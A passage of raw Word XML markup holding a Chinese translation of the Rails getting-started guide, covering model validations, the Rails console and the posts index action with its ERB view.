      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>ActiveRecord::Base</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。Active Record 免费为你的 models 提供了强大的功能，包括基本数据库的 CRUD（创建，读取，更新，删除）操作，数据验证，以及复杂的的查询与其它数据表单多关联的字段的支持能力。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34EC321F"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9.5 添加一些验证</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="644BA79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Rails 包含一些帮助你验证发送到models的数据的方法。打开 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app/models/post.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 并编辑：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8522"/>
      </w:tblGrid>
      <w:tr w:rsidR="005D6D6E" w:rsidRPr="002F7037" w14:paraId="611619D1" w14:textId="77777777" w:rsidTr="00D26583">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="45699EB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class</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>Post &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7FFA3E79" w14:textId="77777777" w:rsidR="005D6D6E"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attr_accessible :content, :name, :title</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>  </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3E3B950E" w14:textId="77777777" w:rsidR="00D26583" w:rsidRPr="002F7037" w:rsidRDefault="00D26583" w:rsidP="002A2B82">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="0ED1FF8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validates :name,  :</w:t>
            </w:r>
            <w:r w:rsidRPr="00D26583">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>presence</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; true</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="29455FF3" w14:textId="77777777" w:rsidR="005D6D6E" w:rsidRDefault="005D6D6E" w:rsidP="002A2B82">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>  validates :title, :presence</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; true,   :</w:t>
            </w:r>
            <w:r w:rsidRPr="00D26583">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>length</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; { :</w:t>
            </w:r>
            <w:r w:rsidRPr="00D26583">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>minimum</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; 5</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657EA8B2" w14:textId="77777777" w:rsidR="00D26583" w:rsidRPr="002F7037" w:rsidRDefault="00D26583" w:rsidP="002A2B82">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="471A901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27E95CD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这些更改会确保所有的 post 都有一个 name 和 titile 并且 title 长度至少五个字符。Rails 可以验证很多种字段，比如字段能否为空和独特性，字段的格式，以及字段的关联。验证详细描述在 </w:t>
      </w:r>
      <w:hyperlink r:id="rId86" w:anchor="validations-overview" w:history="1">
        <w:r w:rsidRPr="002F7037">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Active Record Validations and Callbacks</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="3E9C6061"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9.6 使用控制台</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="102A37C4"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要想在action里面查看你的验证你可以使用 console。console 是一个可以让你在你的应用程序的上下文中执行 Ruby 代码的命令行工具：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2016"/>
      </w:tblGrid>
      <w:tr w:rsidR="005D6D6E" w:rsidRPr="002F7037" w14:paraId="1EEC8617" w14:textId="77777777" w:rsidTr="00D26583">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3EAA1B7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rails console</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="72E0DC5F"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默认的 console 将会改变你的数据库。你可以通过运行 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>rails console —sandbox</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>,这样你可以（在退出控制台后）回滚你的任何操作</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3773154F"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在载入控制台后，你可以使用它来对你应用程序的models进行工作：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8522"/>
      </w:tblGrid>
      <w:tr w:rsidR="005D6D6E" w:rsidRPr="002F7037" w14:paraId="6242FEE6" w14:textId="77777777" w:rsidTr="00D26583">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="550547A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&gt;&gt; p = Post.new(:content =&gt; "A new post")</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="469A7DE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=&gt; #&lt;Post id: nil, name: nil, title: nil,</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2FDBDAA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content: "A new post", created_at: nil,</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2060488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updated_at: nil&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="28CB59A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&gt;&gt; p.save</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1C3B4A1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=&gt; false</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="29970A5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&gt;&gt; p.errors.full_messages</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="227449E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=&gt; ["Name can't be blank", "Title can't be blank", "Title is too short (minimum is 5 characters)"]</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3F39A64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这段代码演示了创建一个 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Post</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 实例，并企图保存到数据库并得到一个 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>false</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的返回值（说明保存失败的原因），检查 post 的错误信息。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21ADD5A1"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当你操作完成，输入 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>exit</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 并回车退出 console。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24E94C6B"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不像开发环境的 web 服务器 console 不会自动导入你每行输入的新的代码。如果你改变了你的 models 并且 console 是打开的，输入 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>reload!</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 那么 console 会立即导入他们。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="252570ED"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9.7 Listing All Posts</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2869F59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Let’s dive into the Rails code a little deeper to see how the application is showing us the list of Posts.让我们深入 Rails 代码一点点，去看看程序是怎样展示 post 列表给我们的。打开文件 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app/controllers/posts_controller.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 并且查看 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>index</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> action：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5976"/>
      </w:tblGrid>
      <w:tr w:rsidR="005D6D6E" w:rsidRPr="002F7037" w14:paraId="21D94F43" w14:textId="77777777" w:rsidTr="00142471">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="03FF4BE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def</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>index</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="740F3FD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@posts</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>= Post.all</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="08112F6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1653D4C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respond_to do</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>|format|</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="29170B7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format.html  # index.html.erb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="741FDC5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format.json  { render :json</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; @posts</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05562A4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55A1236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28C2936F"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rPr>
        <w:t>Post.all</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 调用 Post model 并返回当前在数据库中的所有 post 为一个 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Post</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 记录的数组。并且我们将这个数组存储在一个叫做@posts的实例变量中。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B9ED7D9"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有关 Active Record 更多的信息，可以查看 </w:t>
      </w:r>
      <w:hyperlink r:id="rId87" w:history="1">
        <w:r w:rsidRPr="002F7037">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Active Record Query Interface</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 相关记录。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27CB877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这个 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>respond_to</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 块处理了这个动作的 HTML 和 JSON 请求。如果你浏览 </w:t>
      </w:r>
      <w:hyperlink r:id="rId88" w:history="1">
        <w:r w:rsidRPr="002F7037">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>http://localhost:3000/posts.json</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> JSON 包含着所有的 post。这个 HTML 格式在</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app/views/posts/</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的 view 中查找相对应的动作名称。Rails 使来自 action 的所有的（可用的）实例变量对应到view。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8522"/>
      </w:tblGrid>
      <w:tr w:rsidR="005D6D6E" w:rsidRPr="002F7037" w14:paraId="276039E2" w14:textId="77777777" w:rsidTr="004713D8">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4618755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&lt;h1&gt;Listing posts&lt;/h1&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="335B2CC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4BD2A14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&lt;table&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6A81A40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&lt;tr&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0A7E000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&lt;th&gt;Name&lt;/th&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1ED3C67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&lt;th&gt;Title&lt;/th&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3D71865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&lt;th&gt;Content&lt;/th&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="473C946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&lt;th&gt;&lt;/th&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7A15D52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&lt;th&gt;&lt;/th&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="329E6F8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&lt;th&gt;&lt;/th&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0328DFA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&lt;/tr&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="521945E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2E9AFA1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@posts.each</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>do</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>|post| %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0A79596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&lt;tr&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6C670FA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&lt;td&gt;&lt;%=</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
